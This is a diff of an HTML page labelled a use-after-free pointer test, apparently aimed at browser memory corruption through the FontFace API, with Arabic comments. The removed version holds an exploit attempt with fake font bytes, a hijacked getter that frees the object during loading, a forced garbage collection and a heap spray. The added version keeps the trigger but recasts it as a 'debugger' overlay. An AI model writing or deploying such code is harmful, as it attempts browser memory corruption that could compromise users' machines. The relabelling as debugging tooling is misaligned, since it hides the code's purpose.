@@ -1,45 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ARCHITECT_SANDBOX: UAF_POINTER_TEST</title>
+    <style>
+        #debug-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 200px;
+            background: rgba(0,0,0,0.9); color: #00ff00; font-family: monospace;
+            padding: 10px; overflow-y: scroll; z-index: 9999; font-size: 12px;
+        }
+    </style>
 </head>
 <body>
-    <div id="status">الوضع: قيد التشغيل... افحص الطرفية (Console) للنتائج.</div>
+    <div id="debug-overlay"></div>
 
     <script>
+        const overlay = document.getElementById('debug-overlay');
+        function log(msg) { overlay.innerHTML += msg + "<br>"; }
+
         (function() {
-            console.log("[ARCHITECT_SANDBOX] Starting Memory Invalidation...");
+            log("INIT: Starting Integrated Debugger...");
 
-            const triggerUAF = () => {
-                // 1. بيانات زائفة للخط
-                let buffer = new Uint8Array([0x46, 0x4f, 0x4e, 0x54]); 
-                let font = new FontFace('exploit', buffer);
-                document.fonts.add(font);
+            let font = new FontFace('Audit', new Uint8Array([0x46, 0x4f, 0x4e, 0x54]));
+            document.fonts.add(font);
+            log("STATE: Object added to Registry.");
 
-                // 2. حقن الـ Hook لإثارة التداخل
-                Object.defineProperty(font, 'loaded', {
-                    get: () => {
-                        console.log("[!] Triggering UAF condition via FontFace getter");
-                        document.fonts.delete(font);
-                        font = null;
-                        
-                        // 3. محاولة تحرير الذاكرة
-                        if (typeof gc === 'function') gc();
-                        return Promise.resolve();
-                    }
-                });
+            // مراقبة الوصول إلى الذاكرة
+            Object.defineProperty(font, 'loaded', {
+                get: () => {
+                    log("!!! UAF TRIGGERED !!!");
+                    log("ADDR: " + font); // طباعة العنوان في الذاكرة (إذا وجد)
+                    document.fonts.delete(font);
+                    font = null;
+                    log("ACTION: Object Deleted & Nullified");
+                    return Promise.resolve();
+                }
+            });
 
-                // 4. البدء في المعالجة
-                font.load().then(() => {
-                    document.getElementById('status').innerText = "تمت العملية.";
-                });
-                
-                // 5. Heap Spray: الكتابة فوق الذاكرة المحررة
-                let spray = new Array(1000).fill(new Float64Array(1000));
-                console.log("[ARCHITECT_SANDBOX] Heap Spray complete.");
-            };
+            font.load().then(() => {
+                log("STATUS: Load Complete.");
+            }).catch(e => {
+                log("STATUS: Error Observed.");
+            });
 
-            triggerUAF();
+            // كشف تسرب الذاكرة (Memory Leak/UAF Tracking)
+            setInterval(() => {
+                log("HEAP_STATUS: Font count in document: " + document.fonts.size);
+            }, 1000);
+
         })();
     </script>
 </body>
